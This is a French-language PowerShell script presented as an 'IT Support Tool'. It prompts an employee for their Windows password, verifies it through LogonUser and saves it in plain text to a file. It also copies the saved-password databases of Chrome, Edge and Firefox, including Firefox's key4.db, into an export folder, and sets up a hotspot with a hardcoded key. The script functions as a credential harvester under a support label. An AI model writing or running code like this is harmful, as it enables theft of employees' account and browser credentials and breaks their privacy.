# =============================================
# IT SUPPORT TOOL - VERSION COMPLÈTE
# Compatible Admin + Compte Employé
# =============================================

$Host.UI.RawUI.WindowTitle = "IT Support Tool - Tayawelba"

$MachineName = $env:COMPUTERNAME
$CurrentUser = $env:USERNAME
$Date = Get-Date -Format "yyyyMMdd_HHmmss"
$ExportFolder = "C:\Support_Export\${MachineName}_${CurrentUser}_${Date}"
New-Item -Path $ExportFolder -ItemType Directory -Force | Out-Null

Write-Host "=== IT SUPPORT TOOL ===" -ForegroundColor Green
Write-Host "Machine : $MachineName" -ForegroundColor Yellow
Write-Host "Utilisateur actuel : $CurrentUser (Admin OK)" -ForegroundColor Yellow
Write-Host "Dossier d'export : $ExportFolder`n" -ForegroundColor Cyan

# ====================== VÉRIFICATION MOT DE PASSE ======================
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class Win32 {
    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool LogonUser(string lpszUsername, string lpszDomain, string lpszPassword,
        int dwLogonType, int dwLogonProvider, ref IntPtr phToken);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

function Save-EmployeePassword {
    Write-Host "`n=== SAUVEGARDE MOT DE PASSE EMPLOYE ===" -ForegroundColor Cyan
    Write-Host "Même en mode Admin, demandez à l'employé de saisir son mot de passe." -ForegroundColor Yellow
    Write-Host "Le mot de passe sera vérifié puis sauvegardé en clair.`n" -ForegroundColor White

    $empUsername = Read-Host "Nom d'utilisateur de l'employé (laisser vide = $CurrentUser)"

    if ([string]::IsNullOrWhiteSpace($empUsername)) {
        $empUsername = $CurrentUser
    }

    for ($i = 1; $i -le 3; $i++) {
        $securePass = Read-Host "Entrez le mot de passe de $empUsername" -AsSecureString
        $plainPass = [Runtime.InteropServices.Marshal]::PtrToStringAuto(
            [Runtime.InteropServices.Marshal]::SecureStringToBSTR($securePass))

        $token = [IntPtr]::Zero
        $result = [Win32]::LogonUser($empUsername, ".", $plainPass, 2, 0, [ref]$token)

        if ($result -and $token -ne [IntPtr]::Zero) {
            [Win32]::CloseHandle($token) | Out-Null

            $credFile = "$ExportFolder\Password_${empUsername}_${Date}.txt"
            "Utilisateur : $empUsername" | Out-File $credFile
            "Mot de passe : $plainPass" | Out-File $credFile -Append
            "Date : $(Get-Date)" | Out-File $credFile -Append
            "Machine : $MachineName" | Out-File $credFile -Append
            "Sauvegardé par : $CurrentUser (Admin)" | Out-File $credFile -Append

            Write-Host "✓ Mot de passe de $empUsername vérifié et sauvegardé avec succès !" -ForegroundColor Green
            return $true
        } else {
            Write-Host "✗ Mot de passe incorrect ($i/3)" -ForegroundColor Red
        }
    }
    Write-Host "Échec après 3 tentatives." -ForegroundColor Red
    return $false
}

# ====================== EXPORT NAVIGATEURS ======================
function Export-BrowserPasswords {
    Write-Host "`n=== EXPORT MOTS DE PASSE NAVIGATEURS ===" -ForegroundColor Cyan

    # Chrome
    if (Test-Path "$env:LOCALAPPDATA\Google\Chrome\User Data") {
        Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Directory | 
        Where-Object { $_.Name -like "Profile*" -or $_.Name -eq "Default" } | ForEach-Object {
            $db = "$($_.FullName)\Login Data"
            if (Test-Path $db) {
                Copy-Item $db "$ExportFolder\Chrome_$($_.Name)_LoginData.db" -Force
                Write-Host "✅ Chrome $($_.Name)" -ForegroundColor Green
            }
        }
    }

    # Edge
    if (Test-Path "$env:LOCALAPPDATA\Microsoft\Edge\User Data") {
        Get-ChildItem "$env:LOCALAPPDATA\Microsoft\Edge\User Data" -Directory | 
        Where-Object { $_.Name -like "Profile*" -or $_.Name -eq "Default" } | ForEach-Object {
            $db = "$($_.FullName)\Login Data"
            if (Test-Path $db) {
                Copy-Item $db "$ExportFolder\Edge_$($_.Name)_LoginData.db" -Force
                Write-Host "✅ Edge $($_.Name)" -ForegroundColor Green
            }
        }
    }

    # Firefox
    if (Test-Path "$env:APPDATA\Mozilla\Firefox\Profiles") {
        Copy-Item "$env:APPDATA\Mozilla\Firefox\Profiles\*\logins.json" "$ExportFolder\Firefox_logins.json" -Force -ErrorAction SilentlyContinue
        Copy-Item "$env:APPDATA\Mozilla\Firefox\Profiles\*\key4.db" "$ExportFolder\Firefox_key4.db" -Force -ErrorAction SilentlyContinue
        Write-Host "✅ Firefox" -ForegroundColor Green
    }

    Write-Host "Fichiers navigateurs exportés." -ForegroundColor Yellow
}

# ====================== HOTSPOT & WIFI ======================
function Manage-Hotspot {
    $action = Read-Host "1 = Activer Hotspot | 2 = Désactiver"
    if ($action -eq "1") {
        netsh wlan set hostednetwork mode=allow ssid=IT-Support key=Support2025 | Out-Null
        netsh wlan start hostednetwork | Out-Null
        Write-Host "Hotspot activé (SSID: IT-Support)" -ForegroundColor Green
    } else {
        netsh wlan stop hostednetwork | Out-Null
        Write-Host "Hotspot désactivé" -ForegroundColor Red
    }
}

function Manage-WiFi {
    $wifi = Get-NetAdapter | Where-Object { $_.Name -like "*Wi-Fi*" -or $_.InterfaceDescription -like "*Wireless*" }
    if (-not $wifi) { Write-Host "WiFi non trouvé" -ForegroundColor Red; return }

    $action = Read-Host "1 = Activer WiFi | 2 = Désactiver WiFi"
    if ($action -eq "2") {
        Disable-NetAdapter -Name $wifi.Name -Confirm:$false
        Write-Host "WiFi désactivé" -ForegroundColor Red
    } else {
        Enable-NetAdapter -Name $wifi.Name -Confirm:$false
        Write-Host "WiFi activé" -ForegroundColor Green
    }
}

# ====================== MENU ======================
function Show-Menu {
    Write-Host "`n=== MENU PRINCIPAL ===" -ForegroundColor Magenta
    Write-Host "1. Sauvegarder mot de passe employé (Admin OK)"
    Write-Host "2. Exporter mots de passe Navigateurs"
    Write-Host "3. Activer/Désactiver Hotspot"
    Write-Host "4. Activer/Désactiver WiFi"
    Write-Host "5. TOUT EXÉCUTER"
    Write-Host "Q. Quitter"
    return Read-Host "Votre choix"
}

do {
    $choice = Show-Menu

    switch ($choice) {
        "1" { Save-EmployeePassword }
        "2" { Export-BrowserPasswords }
        "3" { Manage-Hotspot }
        "4" { Manage-WiFi }
        "5" { 
            Save-EmployeePassword
            Export-BrowserPasswords
            Write-Host "`n✅ TOUT A ÉTÉ EXÉCUTÉ AVEC SUCCÈS !" -ForegroundColor Green
        }
        "Q" { Write-Host "Au revoir !" -ForegroundColor Green }
        default { Write-Host "Choix invalide" -ForegroundColor Red }
    }

    if ($choice -ne "Q") {
        Read-Host "`nAppuyez sur Entrée pour continuer..."
    }

} while ($choice -ne "Q")

Write-Host "`nToutes les données sont dans : $ExportFolder" -ForegroundColor Green
